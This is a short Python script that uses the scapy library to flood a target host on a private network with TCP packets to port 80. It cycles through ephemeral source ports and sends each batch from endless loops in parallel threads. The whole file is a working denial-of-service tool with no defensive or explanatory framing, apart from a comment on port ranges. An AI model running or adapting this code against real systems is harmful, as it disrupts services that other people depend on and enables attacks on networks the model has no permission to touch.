from scapy.all import *
import time
from random import randint
import threading
from threading import Thread
from multiprocessing import Pool, Process
import os

'''The Internet Assigned Numbers Authority (IANA) suggests the range 49152 to 65535
(2e15+2e14 to 2e16-1) for dynamic or private ports. Many Linux kernels use the port
range 32768 to 61000. FreeBSD has used the IANA port range since release 4.6.'''

#targetIP = '192.168.1.150'
targetIP = '192.168.1.100'
my_ip = '192.168.1.200'


def send_while(pkt_list,i):
 while True:
  now = time.time()
  send(pkt_list)
  elapsed = time.time() - now
  print "Has been sent", i,"packets in:", elapsed,"seconds."
  time.sleep(randint(0,3))
#send(pkt_list, inter=0.25, loop=1)

list_size = 20
pkt_list = []
i = 0

#49912==760
#49952==800
#49827==675
#49832==680

for port in range(49152,49832):
 spoofed_pkt = IP(src=my_ip,dst=targetIP) / TCP(sport=port,dport=80)
 pkt_list.append(spoofed_pkt)
 i = i+1
 if i >=list_size:
  #Process(target=send_pkts, args=(pkt_list,)).start()
  Thread(target=send_while, args=(pkt_list,i,)).start()
  i = 0
  pkt_list = []
  time.sleep(randint(3,10))
